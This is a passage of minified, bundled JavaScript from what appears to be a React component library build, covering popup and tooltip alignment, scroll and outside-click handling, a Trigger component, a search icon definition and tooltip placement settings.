          wt = toNum(Math.round((St.width / Et) * 1e3) / 1e3),
          $t = toNum(Math.round((St.height / vt) * 1e3) / 1e3),
          kt = (Et - Ct - xt - yt) * wt,
          Rt = (vt - _t - Pt - bt) * $t,
          It = Pt * $t,
          Ot = bt * $t,
          Nt = xt * wt,
          zt = yt * wt,
          Bt = 0,
          Wt = 0;
        if (nt === "clip") {
          var Gt = getPxValue(ot);
          (Bt = Gt * wt), (Wt = Gt * $t);
        }
        var Vt = St.x + Nt - Bt,
          Mt = St.y + It - Wt,
          Ft = Vt + St.width + 2 * Bt - Nt - zt - kt,
          Tt = Mt + St.height + 2 * Wt - It - Ot - Rt;
        (o.left = Math.max(o.left, Vt)),
          (o.top = Math.max(o.top, Mt)),
          (o.right = Math.min(o.right, Ft)),
          (o.bottom = Math.min(o.bottom, Tt));
      }
    }),
    o
  );
}
function getUnitOffset(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 0,
    o = "".concat(a),
    s = o.match(/^(.*)\%$/);
  return s ? i * (parseFloat(s[1]) / 100) : parseFloat(o);
}
function getNumberOffset(i, a) {
  var o = a || [],
    s = _slicedToArray$1(o, 2),
    tt = s[0],
    nt = s[1];
  return [getUnitOffset(i.width, tt), getUnitOffset(i.height, nt)];
}
function splitPoints() {
  var i = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "";
  return [i[0], i[1]];
}
function getAlignPoint(i, a) {
  var o = a[0],
    s = a[1],
    tt,
    nt;
  return (
    o === "t"
      ? (nt = i.y)
      : o === "b"
      ? (nt = i.y + i.height)
      : (nt = i.y + i.height / 2),
    s === "l"
      ? (tt = i.x)
      : s === "r"
      ? (tt = i.x + i.width)
      : (tt = i.x + i.width / 2),
    { x: tt, y: nt }
  );
}
function reversePoints(i, a) {
  var o = { t: "b", b: "t", l: "r", r: "l" };
  return i
    .map(function (s, tt) {
      return tt === a ? o[s] || "c" : s;
    })
    .join("");
}
function useAlign(i, a, o, s, tt, nt, ot) {
  var st = reactExports.useState({
      ready: !1,
      offsetX: 0,
      offsetY: 0,
      offsetR: 0,
      offsetB: 0,
      arrowX: 0,
      arrowY: 0,
      scaleX: 1,
      scaleY: 1,
      align: tt[s] || {},
    }),
    ft = _slicedToArray$1(st, 2),
    ht = ft[0],
    gt = ft[1],
    St = reactExports.useRef(0),
    vt = reactExports.useMemo(
      function () {
        return a ? collectScroller(a) : [];
      },
      [a]
    ),
    _t = reactExports.useRef({}),
    Et = function () {
      _t.current = {};
    };
  i || Et();
  var Ct = useEvent(function () {
      if (a && o && i) {
        let zr = function (bn, sn) {
            var En =
                arguments.length > 2 && arguments[2] !== void 0
                  ? arguments[2]
                  : rr,
              Nn = Ht.x + bn,
              Dn = Ht.y + sn,
              _i = Nn + tr,
              ir = Dn + nr,
              dr = Math.max(Nn, En.left),
              $r = Math.max(Dn, En.top),
              kr = Math.min(_i, En.right),
              Pr = Math.min(ir, En.bottom);
            return Math.max(0, (kr - dr) * (Pr - $r));
          },
          Sn = function () {
            (rn = Ht.y + pr), (nn = rn + nr), (Mr = Ht.x + _r), (gn = Mr + tr);
          };
        var ga = zr,
          xa = Sn,
          xt,
          yt,
          wt,
          $t,
          kt = a,
          Rt = kt.ownerDocument,
          It = getWin(kt),
          Ot = It.getComputedStyle(kt),
          Nt = Ot.width,
          zt = Ot.height,
          Bt = Ot.position,
          Wt = kt.style.left,
          Gt = kt.style.top,
          Vt = kt.style.right,
          Mt = kt.style.bottom,
          Ft = kt.style.overflow,
          Tt = _objectSpread2$1(_objectSpread2$1({}, tt[s]), nt),
          At = Rt.createElement("div");
        (xt = kt.parentElement) === null || xt === void 0 || xt.appendChild(At),
          (At.style.left = "".concat(kt.offsetLeft, "px")),
          (At.style.top = "".concat(kt.offsetTop, "px")),
          (At.style.position = Bt),
          (At.style.height = "".concat(kt.offsetHeight, "px")),
          (At.style.width = "".concat(kt.offsetWidth, "px")),
          (kt.style.left = "0"),
          (kt.style.top = "0"),
          (kt.style.right = "auto"),
          (kt.style.bottom = "auto"),
          (kt.style.overflow = "hidden");
        var Lt;
        if (Array.isArray(o)) Lt = { x: o[0], y: o[1], width: 0, height: 0 };
        else {
          var jt,
            Dt,
            Ut = o.getBoundingClientRect();
          (Ut.x = (jt = Ut.x) !== null && jt !== void 0 ? jt : Ut.left),
            (Ut.y = (Dt = Ut.y) !== null && Dt !== void 0 ? Dt : Ut.top),
            (Lt = { x: Ut.x, y: Ut.y, width: Ut.width, height: Ut.height });
        }
        var Ht = kt.getBoundingClientRect();
        (Ht.x = (yt = Ht.x) !== null && yt !== void 0 ? yt : Ht.left),
          (Ht.y = (wt = Ht.y) !== null && wt !== void 0 ? wt : Ht.top);
        var Kt = Rt.documentElement,
          qt = Kt.clientWidth,
          Qt = Kt.clientHeight,
          Zt = Kt.scrollWidth,
          Jt = Kt.scrollHeight,
          er = Kt.scrollTop,
          sr = Kt.scrollLeft,
          nr = Ht.height,
          tr = Ht.width,
          Xt = Lt.height,
          hr = Lt.width,
          cr = { left: 0, top: 0, right: qt, bottom: Qt },
          yr = { left: -sr, top: -er, right: Zt - sr, bottom: Jt - er },
          vr = Tt.htmlRegion,
          xr = "visible",
          Sr = "visibleFirst";
        vr !== "scroll" && vr !== Sr && (vr = xr);
        var or = vr === Sr,
          mr = getVisibleArea(yr, vt),
          Yt = getVisibleArea(cr, vt),
          rr = vr === xr ? Yt : mr,
          ar = or ? Yt : rr;
        (kt.style.left = "auto"),
          (kt.style.top = "auto"),
          (kt.style.right = "0"),
          (kt.style.bottom = "0");
        var gr = kt.getBoundingClientRect();
        (kt.style.left = Wt),
          (kt.style.top = Gt),
          (kt.style.right = Vt),
          (kt.style.bottom = Mt),
          (kt.style.overflow = Ft),
          ($t = kt.parentElement) === null ||
            $t === void 0 ||
            $t.removeChild(At);
        var br = toNum(Math.round((tr / parseFloat(Nt)) * 1e3) / 1e3),
          Cr = toNum(Math.round((nr / parseFloat(zt)) * 1e3) / 1e3);
        if (br === 0 || Cr === 0 || (isDOM(o) && !isVisible(o))) return;
        var Rr = Tt.offset,
          Ar = Tt.targetOffset,
          Ur = getNumberOffset(Ht, Rr),
          Ir = _slicedToArray$1(Ur, 2),
          ur = Ir[0],
          lr = Ir[1],
          Fr = getNumberOffset(Lt, Ar),
          Vr = _slicedToArray$1(Fr, 2),
          Hr = Vr[0],
          qr = Vr[1];
        (Lt.x -= Hr), (Lt.y -= qr);
        var Cn = Tt.points || [],
          dn = _slicedToArray$1(Cn, 2),
          hn = dn[0],
          on = dn[1],
          Nr = splitPoints(on),
          jr = splitPoints(hn),
          Zr = getAlignPoint(Lt, Nr),
          Tr = getAlignPoint(Ht, jr),
          Dr = _objectSpread2$1({}, Tt),
          _r = Zr.x - Tr.x + ur,
          pr = Zr.y - Tr.y + lr,
          Gr = zr(_r, pr),
          Jr = zr(_r, pr, Yt),
          wr = getAlignPoint(Lt, ["t", "l"]),
          Er = getAlignPoint(Ht, ["t", "l"]),
          Br = getAlignPoint(Lt, ["b", "r"]),
          Lr = getAlignPoint(Ht, ["b", "r"]),
          Wr = Tt.overflow || {},
          pn = Wr.adjustX,
          mn = Wr.adjustY,
          en = Wr.shiftX,
          tn = Wr.shiftY,
          ln = function (sn) {
            return typeof sn == "boolean" ? sn : sn >= 0;
          },
          rn,
          nn,
          Mr,
          gn;
        Sn();
        var cn = ln(mn),
          Pn = jr[0] === Nr[0];
        if (cn && jr[0] === "t" && (nn > ar.bottom || _t.current.bt)) {
          var Or = pr;
          Pn ? (Or -= nr - Xt) : (Or = wr.y - Lr.y - lr);
          var Tn = zr(_r, Or),
            Vn = zr(_r, Or, Yt);
          Tn > Gr || (Tn === Gr && (!or || Vn >= Jr))
            ? ((_t.current.bt = !0),
              (pr = Or),
              (lr = -lr),
              (Dr.points = [reversePoints(jr, 0), reversePoints(Nr, 0)]))
            : (_t.current.bt = !1);
        }
        if (cn && jr[0] === "b" && (rn < ar.top || _t.current.tb)) {
          var un = pr;
          Pn ? (un += nr - Xt) : (un = Br.y - Er.y - lr);
          var kn = zr(_r, un),
            Hn = zr(_r, un, Yt);
          kn > Gr || (kn === Gr && (!or || Hn >= Jr))
            ? ((_t.current.tb = !0),
              (pr = un),
              (lr = -lr),
              (Dr.points = [reversePoints(jr, 0), reversePoints(Nr, 0)]))
            : (_t.current.tb = !1);
        }
        var Rn = ln(pn),
          An = jr[1] === Nr[1];
        if (Rn && jr[1] === "l" && (gn > ar.right || _t.current.rl)) {
          var fn = _r;
          An ? (fn -= tr - hr) : (fn = wr.x - Lr.x - ur);
          var In = zr(fn, pr),
            vn = zr(fn, pr, Yt);
          In > Gr || (In === Gr && (!or || vn >= Jr))
            ? ((_t.current.rl = !0),
              (_r = fn),
              (ur = -ur),
              (Dr.points = [reversePoints(jr, 1), reversePoints(Nr, 1)]))
            : (_t.current.rl = !1);
        }
        if (Rn && jr[1] === "r" && (Mr < ar.left || _t.current.lr)) {
          var an = _r;
          An ? (an += tr - hr) : (an = Br.x - Er.x - ur);
          var Mn = zr(an, pr),
            Fn = zr(an, pr, Yt);
          Mn > Gr || (Mn === Gr && (!or || Fn >= Jr))
            ? ((_t.current.lr = !0),
              (_r = an),
              (ur = -ur),
              (Dr.points = [reversePoints(jr, 1), reversePoints(Nr, 1)]))
            : (_t.current.lr = !1);
        }
        Sn();
        var Xr = en === !0 ? 0 : en;
        typeof Xr == "number" &&
          (Mr < Yt.left &&
            ((_r -= Mr - Yt.left - ur),
            Lt.x + hr < Yt.left + Xr && (_r += Lt.x - Yt.left + hr - Xr)),
          gn > Yt.right &&
            ((_r -= gn - Yt.right - ur),
            Lt.x > Yt.right - Xr && (_r += Lt.x - Yt.right + Xr)));
        var Kr = tn === !0 ? 0 : tn;
        typeof Kr == "number" &&
          (rn < Yt.top &&
            ((pr -= rn - Yt.top - lr),
            Lt.y + Xt < Yt.top + Kr && (pr += Lt.y - Yt.top + Xt - Kr)),
          nn > Yt.bottom &&
            ((pr -= nn - Yt.bottom - lr),
            Lt.y > Yt.bottom - Kr && (pr += Lt.y - Yt.bottom + Kr)));
        var yn = Ht.x + _r,
          xn = yn + tr,
          Yr = Ht.y + pr,
          Gn = Yr + nr,
          jn = Lt.x,
          Wn = jn + hr,
          _n = Lt.y,
          Un = _n + Xt,
          Kn = Math.max(yn, jn),
          qn = Math.min(xn, Wn),
          On = (Kn + qn) / 2,
          Xn = On - yn,
          Yn = Math.max(Yr, _n),
          Ln = Math.min(Gn, Un),
          Qn = (Yn + Ln) / 2,
          Zn = Qn - Yr;
        ot == null || ot(a, Dr);
        var wn = gr.right - Ht.x - (_r + Ht.width),
          Qr = gr.bottom - Ht.y - (pr + Ht.height);
        br === 1 && ((_r = Math.round(_r)), (wn = Math.round(wn))),
          Cr === 1 && ((pr = Math.round(pr)), (Qr = Math.round(Qr)));
        var Jn = {
          ready: !0,
          offsetX: _r / br,
          offsetY: pr / Cr,
          offsetR: wn / br,
          offsetB: Qr / Cr,
          arrowX: Xn / br,
          arrowY: Zn / Cr,
          scaleX: br,
          scaleY: Cr,
          align: Dr,
        };
        gt(Jn);
      }
    }),
    Pt = function () {
      St.current += 1;
      var yt = St.current;
      Promise.resolve().then(function () {
        St.current === yt && Ct();
      });
    },
    bt = function () {
      gt(function (yt) {
        return _objectSpread2$1(_objectSpread2$1({}, yt), {}, { ready: !1 });
      });
    };
  return (
    useLayoutEffect(bt, [s]),
    useLayoutEffect(
      function () {
        i || bt();
      },
      [i]
    ),
    [
      ht.ready,
      ht.offsetX,
      ht.offsetY,
      ht.offsetR,
      ht.offsetB,
      ht.arrowX,
      ht.arrowY,
      ht.scaleX,
      ht.scaleY,
      ht.align,
      Pt,
    ]
  );
}
function useWatch(i, a, o, s, tt) {
  useLayoutEffect(
    function () {
      if (i && a && o) {
        let vt = function () {
          s(), tt();
        };
        var St = vt,
          nt = a,
          ot = o,
          st = collectScroller(nt),
          ft = collectScroller(ot),
          ht = getWin(ot),
          gt = new Set(
            [ht].concat(_toConsumableArray(st), _toConsumableArray(ft))
          );
        return (
          gt.forEach(function (_t) {
            _t.addEventListener("scroll", vt, { passive: !0 });
          }),
          ht.addEventListener("resize", vt, { passive: !0 }),
          s(),
          function () {
            gt.forEach(function (_t) {
              _t.removeEventListener("scroll", vt),
                ht.removeEventListener("resize", vt);
            });
          }
        );
      }
    },
    [i, a, o]
  );
}
function useWinClick(i, a, o, s, tt, nt, ot, st) {
  var ft = reactExports.useRef(i);
  ft.current = i;
  var ht = reactExports.useRef(!1);
  reactExports.useEffect(
    function () {
      if (a && s && (!tt || nt)) {
        var St = function () {
            ht.current = !1;
          },
          vt = function (Pt) {
            var bt;
            ft.current &&
              !ot(
                ((bt = Pt.composedPath) === null ||
                bt === void 0 ||
                (bt = bt.call(Pt)) === null ||
                bt === void 0
                  ? void 0
                  : bt[0]) || Pt.target
              ) &&
              !ht.current &&
              st(!1);
          },
          _t = getWin(s);
        _t.addEventListener("pointerdown", St, !0),
          _t.addEventListener("mousedown", vt, !0),
          _t.addEventListener("contextmenu", vt, !0);
        var Et = getShadowRoot(o);
        return (
          Et &&
            (Et.addEventListener("mousedown", vt, !0),
            Et.addEventListener("contextmenu", vt, !0)),
          function () {
            _t.removeEventListener("pointerdown", St, !0),
              _t.removeEventListener("mousedown", vt, !0),
              _t.removeEventListener("contextmenu", vt, !0),
              Et &&
                (Et.removeEventListener("mousedown", vt, !0),
                Et.removeEventListener("contextmenu", vt, !0));
          }
        );
      }
    },
    [a, o, s, tt, nt]
  );
  function gt() {
    ht.current = !0;
  }
  return gt;
}
var _excluded$7 = [
  "prefixCls",
  "children",
  "action",
  "showAction",
  "hideAction",
  "popupVisible",
  "defaultPopupVisible",
  "onPopupVisibleChange",
  "afterPopupVisibleChange",
  "mouseEnterDelay",
  "mouseLeaveDelay",
  "focusDelay",
  "blurDelay",
  "mask",
  "maskClosable",
  "getPopupContainer",
  "forceRender",
  "autoDestroy",
  "destroyPopupOnHide",
  "popup",
  "popupClassName",
  "popupStyle",
  "popupPlacement",
  "builtinPlacements",
  "popupAlign",
  "zIndex",
  "stretch",
  "getPopupClassNameFromAlign",
  "fresh",
  "alignPoint",
  "onPopupClick",
  "onPopupAlign",
  "arrow",
  "popupMotion",
  "maskMotion",
  "popupTransitionName",
  "popupAnimation",
  "maskTransitionName",
  "maskAnimation",
  "className",
  "getTriggerDOMNode",
];
function generateTrigger() {
  var i =
      arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : Portal,
    a = reactExports.forwardRef(function (o, s) {
      var tt = o.prefixCls,
        nt = tt === void 0 ? "rc-trigger-popup" : tt,
        ot = o.children,
        st = o.action,
        ft = st === void 0 ? "hover" : st,
        ht = o.showAction,
        gt = o.hideAction,
        St = o.popupVisible,
        vt = o.defaultPopupVisible,
        _t = o.onPopupVisibleChange,
        Et = o.afterPopupVisibleChange,
        Ct = o.mouseEnterDelay,
        Pt = o.mouseLeaveDelay,
        bt = Pt === void 0 ? 0.1 : Pt,
        xt = o.focusDelay,
        yt = o.blurDelay,
        wt = o.mask,
        $t = o.maskClosable,
        kt = $t === void 0 ? !0 : $t,
        Rt = o.getPopupContainer,
        It = o.forceRender,
        Ot = o.autoDestroy,
        Nt = o.destroyPopupOnHide,
        zt = o.popup,
        Bt = o.popupClassName,
        Wt = o.popupStyle,
        Gt = o.popupPlacement,
        Vt = o.builtinPlacements,
        Mt = Vt === void 0 ? {} : Vt,
        Ft = o.popupAlign,
        Tt = o.zIndex,
        At = o.stretch,
        Lt = o.getPopupClassNameFromAlign,
        jt = o.fresh,
        Dt = o.alignPoint,
        Ut = o.onPopupClick,
        Ht = o.onPopupAlign,
        Kt = o.arrow,
        qt = o.popupMotion,
        Qt = o.maskMotion,
        Zt = o.popupTransitionName,
        Jt = o.popupAnimation,
        er = o.maskTransitionName,
        sr = o.maskAnimation,
        nr = o.className,
        tr = o.getTriggerDOMNode,
        Xt = _objectWithoutProperties$1(o, _excluded$7),
        hr = Ot || Nt || !1,
        cr = reactExports.useState(!1),
        yr = _slicedToArray$1(cr, 2),
        vr = yr[0],
        xr = yr[1];
      useLayoutEffect(function () {
        xr(isMobile());
      }, []);
      var Sr = reactExports.useRef({}),
        or = reactExports.useContext(TriggerContext),
        mr = reactExports.useMemo(
          function () {
            return {
              registerSubPopup: function (dr, $r) {
                (Sr.current[dr] = $r),
                  or == null || or.registerSubPopup(dr, $r);
              },
            };
          },
          [or]
        ),
        Yt = useId(),
        rr = reactExports.useState(null),
        ar = _slicedToArray$1(rr, 2),
        gr = ar[0],
        br = ar[1],
        Cr = reactExports.useRef(null),
        Rr = useEvent(function (ir) {
          (Cr.current = ir),
            isDOM(ir) && gr !== ir && br(ir),
            or == null || or.registerSubPopup(Yt, ir);
        }),
        Ar = reactExports.useState(null),
        Ur = _slicedToArray$1(Ar, 2),
        Ir = Ur[0],
        ur = Ur[1],
        lr = reactExports.useRef(null),
        Fr = useEvent(function (ir) {
          isDOM(ir) && Ir !== ir && (ur(ir), (lr.current = ir));
        }),
        Vr = reactExports.Children.only(ot),
        Hr = (Vr == null ? void 0 : Vr.props) || {},
        qr = {},
        Cn = useEvent(function (ir) {
          var dr,
            $r,
            kr = Ir;
          return (
            (kr == null ? void 0 : kr.contains(ir)) ||
            ((dr = getShadowRoot(kr)) === null || dr === void 0
              ? void 0
              : dr.host) === ir ||
            ir === kr ||
            (gr == null ? void 0 : gr.contains(ir)) ||
            (($r = getShadowRoot(gr)) === null || $r === void 0
              ? void 0
              : $r.host) === ir ||
            ir === gr ||
            Object.values(Sr.current).some(function (Pr) {
              return (Pr == null ? void 0 : Pr.contains(ir)) || ir === Pr;
            })
          );
        }),
        dn = getMotion(nt, qt, Jt, Zt),
        hn = getMotion(nt, Qt, sr, er),
        on = reactExports.useState(vt || !1),
        Nr = _slicedToArray$1(on, 2),
        jr = Nr[0],
        Zr = Nr[1],
        Tr = St ?? jr,
        Dr = useEvent(function (ir) {
          St === void 0 && Zr(ir);
        });
      useLayoutEffect(
        function () {
          Zr(St || !1);
        },
        [St]
      );
      var _r = reactExports.useRef(Tr);
      _r.current = Tr;
      var pr = reactExports.useRef([]);
      pr.current = [];
      var Gr = useEvent(function (ir) {
          var dr;
          Dr(ir),
            ((dr = pr.current[pr.current.length - 1]) !== null && dr !== void 0
              ? dr
              : Tr) !== ir && (pr.current.push(ir), _t == null || _t(ir));
        }),
        Jr = reactExports.useRef(),
        wr = function () {
          clearTimeout(Jr.current);
        },
        Er = function (dr) {
          var $r =
            arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : 0;
          wr(),
            $r === 0
              ? Gr(dr)
              : (Jr.current = setTimeout(function () {
                  Gr(dr);
                }, $r * 1e3));
        };
      reactExports.useEffect(function () {
        return wr;
      }, []);
      var Br = reactExports.useState(!1),
        Lr = _slicedToArray$1(Br, 2),
        Wr = Lr[0],
        pn = Lr[1];
      useLayoutEffect(
        function (ir) {
          (!ir || Tr) && pn(!0);
        },
        [Tr]
      );
      var mn = reactExports.useState(null),
        en = _slicedToArray$1(mn, 2),
        tn = en[0],
        ln = en[1],
        rn = reactExports.useState(null),
        nn = _slicedToArray$1(rn, 2),
        Mr = nn[0],
        gn = nn[1],
        cn = function (dr) {
          gn([dr.clientX, dr.clientY]);
        },
        Pn = useAlign(Tr, gr, Dt && Mr !== null ? Mr : Ir, Gt, Mt, Ft, Ht),
        Or = _slicedToArray$1(Pn, 11),
        Tn = Or[0],
        Vn = Or[1],
        un = Or[2],
        kn = Or[3],
        Hn = Or[4],
        Rn = Or[5],
        An = Or[6],
        fn = Or[7],
        In = Or[8],
        vn = Or[9],
        an = Or[10],
        Mn = useAction(vr, ft, ht, gt),
        Fn = _slicedToArray$1(Mn, 2),
        Xr = Fn[0],
        Kr = Fn[1],
        yn = Xr.has("click"),
        xn = Kr.has("click") || Kr.has("contextMenu"),
        Yr = useEvent(function () {
          Wr || an();
        }),
        Gn = function () {
          _r.current && Dt && xn && Er(!1);
        };
      useWatch(Tr, Ir, gr, Yr, Gn),
        useLayoutEffect(
          function () {
            Yr();
          },
          [Mr, Gt]
        ),
        useLayoutEffect(
          function () {
            Tr && !(Mt != null && Mt[Gt]) && Yr();
          },
          [JSON.stringify(Ft)]
        );
      var jn = reactExports.useMemo(
        function () {
          var ir = getAlignPopupClassName(Mt, nt, vn, Dt);
          return classNames(ir, Lt == null ? void 0 : Lt(vn));
        },
        [vn, Lt, Mt, nt, Dt]
      );
      reactExports.useImperativeHandle(s, function () {
        return {
          nativeElement: lr.current,
          popupElement: Cr.current,
          forceAlign: Yr,
        };
      });
      var Wn = reactExports.useState(0),
        _n = _slicedToArray$1(Wn, 2),
        Un = _n[0],
        Kn = _n[1],
        qn = reactExports.useState(0),
        On = _slicedToArray$1(qn, 2),
        Xn = On[0],
        Yn = On[1],
        Ln = function () {
          if (At && Ir) {
            var dr = Ir.getBoundingClientRect();
            Kn(dr.width), Yn(dr.height);
          }
        },
        Qn = function () {
          Ln(), Yr();
        },
        Zn = function (dr) {
          pn(!1), an(), Et == null || Et(dr);
        },
        wn = function () {
          return new Promise(function (dr) {
            Ln(),
              ln(function () {
                return dr;
              });
          });
        };
      useLayoutEffect(
        function () {
          tn && (an(), tn(), ln(null));
        },
        [tn]
      );
      function Qr(ir, dr, $r, kr) {
        qr[ir] = function (Pr) {
          var Bn;
          kr == null || kr(Pr), Er(dr, $r);
          for (
            var na = arguments.length,
              ba = new Array(na > 1 ? na - 1 : 0),
              zn = 1;
            zn < na;
            zn++
          )
            ba[zn - 1] = arguments[zn];
          (Bn = Hr[ir]) === null ||
            Bn === void 0 ||
            Bn.call.apply(Bn, [Hr, Pr].concat(ba));
        };
      }
      (yn || xn) &&
        (qr.onClick = function (ir) {
          var dr;
          _r.current && xn ? Er(!1) : !_r.current && yn && (cn(ir), Er(!0));
          for (
            var $r = arguments.length,
              kr = new Array($r > 1 ? $r - 1 : 0),
              Pr = 1;
            Pr < $r;
            Pr++
          )
            kr[Pr - 1] = arguments[Pr];
          (dr = Hr.onClick) === null ||
            dr === void 0 ||
            dr.call.apply(dr, [Hr, ir].concat(kr));
        });
      var Jn = useWinClick(Tr, xn, Ir, gr, wt, kt, Cn, Er),
        ga = Xr.has("hover"),
        xa = Kr.has("hover"),
        zr,
        Sn;
      ga &&
        (Qr("onMouseEnter", !0, Ct, function (ir) {
          cn(ir);
        }),
        Qr("onPointerEnter", !0, Ct, function (ir) {
          cn(ir);
        }),
        (zr = function (dr) {
          (Tr || Wr) &&
            gr !== null &&
            gr !== void 0 &&
            gr.contains(dr.target) &&
            Er(!0, Ct);
        }),
        Dt &&
          (qr.onMouseMove = function (ir) {
            var dr;
            (dr = Hr.onMouseMove) === null || dr === void 0 || dr.call(Hr, ir);
          })),
        xa &&
          (Qr("onMouseLeave", !1, bt),
          Qr("onPointerLeave", !1, bt),
          (Sn = function () {
            Er(!1, bt);
          })),
        Xr.has("focus") && Qr("onFocus", !0, xt),
        Kr.has("focus") && Qr("onBlur", !1, yt),
        Xr.has("contextMenu") &&
          (qr.onContextMenu = function (ir) {
            var dr;
            _r.current && Kr.has("contextMenu") ? Er(!1) : (cn(ir), Er(!0)),
              ir.preventDefault();
            for (
              var $r = arguments.length,
                kr = new Array($r > 1 ? $r - 1 : 0),
                Pr = 1;
              Pr < $r;
              Pr++
            )
              kr[Pr - 1] = arguments[Pr];
            (dr = Hr.onContextMenu) === null ||
              dr === void 0 ||
              dr.call.apply(dr, [Hr, ir].concat(kr));
          }),
        nr && (qr.className = classNames(Hr.className, nr));
      var bn = _objectSpread2$1(_objectSpread2$1({}, Hr), qr),
        sn = {},
        En = [
          "onContextMenu",
          "onClick",
          "onMouseDown",
          "onTouchStart",
          "onMouseEnter",
          "onMouseLeave",
          "onFocus",
          "onBlur",
        ];
      En.forEach(function (ir) {
        Xt[ir] &&
          (sn[ir] = function () {
            for (
              var dr, $r = arguments.length, kr = new Array($r), Pr = 0;
              Pr < $r;
              Pr++
            )
              kr[Pr] = arguments[Pr];
            (dr = bn[ir]) === null ||
              dr === void 0 ||
              dr.call.apply(dr, [bn].concat(kr)),
              Xt[ir].apply(Xt, kr);
          });
      });
      var Nn = reactExports.cloneElement(
          Vr,
          _objectSpread2$1(_objectSpread2$1({}, bn), sn)
        ),
        Dn = { x: Rn, y: An },
        _i = Kt ? _objectSpread2$1({}, Kt !== !0 ? Kt : {}) : null;
      return reactExports.createElement(
        reactExports.Fragment,
        null,
        reactExports.createElement(
          RefResizeObserver,
          { disabled: !Tr, ref: Fr, onResize: Qn },
          reactExports.createElement(
            TriggerWrapper,
            { getTriggerDOMNode: tr },
            Nn
          )
        ),
        reactExports.createElement(
          TriggerContext.Provider,
          { value: mr },
          reactExports.createElement(Popup$1, {
            portal: i,
            ref: Rr,
            prefixCls: nt,
            popup: zt,
            className: classNames(Bt, jn),
            style: Wt,
            target: Ir,
            onMouseEnter: zr,
            onMouseLeave: Sn,
            onPointerEnter: zr,
            zIndex: Tt,
            open: Tr,
            keepDom: Wr,
            fresh: jt,
            onClick: Ut,
            onPointerDownCapture: Jn,
            mask: wt,
            motion: dn,
            maskMotion: hn,
            onVisibleChanged: Zn,
            onPrepare: wn,
            forceRender: It,
            autoDestroy: hr,
            getPopupContainer: Rt,
            align: vn,
            arrow: _i,
            arrowPos: Dn,
            ready: Tn,
            offsetX: Vn,
            offsetY: un,
            offsetR: kn,
            offsetB: Hn,
            onAlign: Yr,
            stretch: At,
            targetWidth: Un / fn,
            targetHeight: Xn / In,
          })
        )
      );
    });
  return a;
}
const Trigger = generateTrigger(Portal);
function getStatusClassNames(i, a, o) {
  return classNames({
    [`${i}-status-success`]: a === "success",
    [`${i}-status-warning`]: a === "warning",
    [`${i}-status-error`]: a === "error",
    [`${i}-status-validating`]: a === "validating",
    [`${i}-has-feedback`]: o,
  });
}
const getMergedStatus = (i, a) => a || i,
  useVariant = function (i, a) {
    let o =
      arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : void 0;
    var s, tt;
    const { variant: nt, [i]: ot } = reactExports.useContext(ConfigContext),
      st = reactExports.useContext(VariantContext),
      ft = ot == null ? void 0 : ot.variant;
    let ht;
    typeof a < "u"
      ? (ht = a)
      : o === !1
      ? (ht = "borderless")
      : (ht =
          (tt = (s = st ?? ft) !== null && s !== void 0 ? s : nt) !== null &&
          tt !== void 0
            ? tt
            : "outlined");
    const gt = Variants.includes(ht);
    return [ht, gt];
  };
var SearchOutlined$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1-56.6-56.7-132-87.9-212.1-87.9s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6a8.2 8.2 0 0011.6 0l43.6-43.5a8.2 8.2 0 000-11.6zM570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4z",
          },
        },
      ],
    },
    name: "search",
    theme: "outlined",
  },
  SearchOutlined = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: SearchOutlined$1 })
    );
  },
  RefIcon$6 = reactExports.forwardRef(SearchOutlined);
function Popup(i) {
  var a = i.children,
    o = i.prefixCls,
    s = i.id,
    tt = i.overlayInnerStyle,
    nt = i.className,
    ot = i.style;
  return reactExports.createElement(
    "div",
    { className: classNames("".concat(o, "-content"), nt), style: ot },
    reactExports.createElement(
      "div",
      { className: "".concat(o, "-inner"), id: s, role: "tooltip", style: tt },
      typeof a == "function" ? a() : a
    )
  );
}
var autoAdjustOverflowTopBottom = { shiftX: 64, adjustY: 1 },
  autoAdjustOverflowLeftRight = { adjustX: 1, shiftY: !0 },
  targetOffset = [0, 0],
  placements = {
    left: {
      points: ["cr", "cl"],
      overflow: autoAdjustOverflowLeftRight,
      offset: [-4, 0],
      targetOffset,
    },
    right: {
      points: ["cl", "cr"],
      overflow: autoAdjustOverflowLeftRight,
      offset: [4, 0],
      targetOffset,
    },
    top: {
      points: ["bc", "tc"],
      overflow: autoAdjustOverflowTopBottom,
      offset: [0, -4],
      targetOffset,
    },
    bottom: {
      points: ["tc", "bc"],
      overflow: autoAdjustOverflowTopBottom,
      offset: [0, 4],
      targetOffset,
    },
    topLeft: {
      points: ["bl", "tl"],
      overflow: autoAdjustOverflowTopBottom,
      offset: [0, -4],
      targetOffset,
    },
    leftTop: {
      points: ["tr", "tl"],
      overflow: autoAdjustOverflowLeftRight,
      offset: [-4, 0],
      targetOffset,
    },
    topRight: {
      points: ["br", "tr"],
      overflow: autoAdjustOverflowTopBottom,
      offset: [0, -4],
      targetOffset,
    },
    rightTop: {
      points: ["tl", "tr"],
      overflow: autoAdjustOverflowLeftRight,
      offset: [4, 0],
      targetOffset,
    },
    bottomRight: {
      points: ["tr", "br"],
      overflow: autoAdjustOverflowTopBottom,
      offset: [0, 4],
      targetOffset,
    },
    rightBottom: {
      points: ["bl", "br"],
      overflow: autoAdjustOverflowLeftRight,
      offset: [4, 0],
      targetOffset,
    },
    bottomLeft: {
      points: ["tl", "bl"],
      overflow: autoAdjustOverflowTopBottom,
      offset: [0, 4],
      targetOffset,
    },
    leftBottom: {
      points: ["br", "bl"],
      overflow: autoAdjustOverflowLeftRight,
      offset: [-4, 0],
      targetOffset,
    },
  },
